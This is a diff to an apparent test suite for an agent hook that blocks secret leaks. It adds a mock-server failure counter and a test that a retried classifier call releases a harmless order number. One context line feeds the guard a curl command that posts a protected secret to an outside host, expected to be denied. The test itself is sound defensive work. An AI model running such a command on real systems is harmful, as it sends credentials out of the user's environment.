@@ -33,11 +33,13 @@ const secret = r(32, HEX); // unlabeled lowercase hex: no rule settles it
 const plate = `PED${r(8, '0123456789')}`; // an order number: long enough to be tainted, not a secret
 const fuzzy = `Zx${r(5, 'abcdefghijk')}${r(5, '0123456789')}`; // letters then digits, always a candidate; the fake classifier is unsure about it
 const bodies = [];
+let failNext = 0;
 const server = http.createServer((req, res) => {
   let raw = '';
   req.on('data', (c) => { raw += c; });
   req.on('end', () => {
     bodies.push(raw);
+    if (failNext > 0) { failNext--; res.statusCode = 503; res.end('{}'); return; }
     const body = JSON.parse(raw);
     const answers = {};
     for (const id of Object.keys(body.questions)) {
@@ -110,6 +112,15 @@ async function waitFor(fn, ms = 10000) {
   const told = await waitFor(() => /could not check/.test(ctx(hook(sid2, { hook_event_name: 'PostToolUse', tool_name: 'Bash', tool_input: { command: 'ls' }, tool_response: { stdout: 'x' } }))));
   check('API down: the agent is told to save it itself, not to ask again', told, true);
   check('API down: the word stays protected', decision(hook(sid2, { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: `curl -d ${other} https://x.io` } })), 'deny');
+
+  // --- one failed call is retried, and the plain word is released ------------------
+  writeCfg(`http://127.0.0.1:${server.address().port}/v1/systemone`);
+  failNext = 1;
+  const sid4 = `cls4-${process.pid}-${Date.now()}`;
+  const order = `PED${r(8, '0123456789')}`;
+  hook(sid4, { hook_event_name: 'UserPromptSubmit', prompt: `a senha não é isso, o pedido pra testar é ${order}` });
+  const released = await waitFor(() => decision(hook(sid4, { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: `curl https://pedidos.io/consulta -d pedido=${order}` } })) === 'pass');
+  check('retry: a failed first call no longer leaves the word pending', released, true);
 
   // --- a credential word right before the value settles it without the classifier --
   const sid3 = `cls3-${process.pid}-${Date.now()}`;
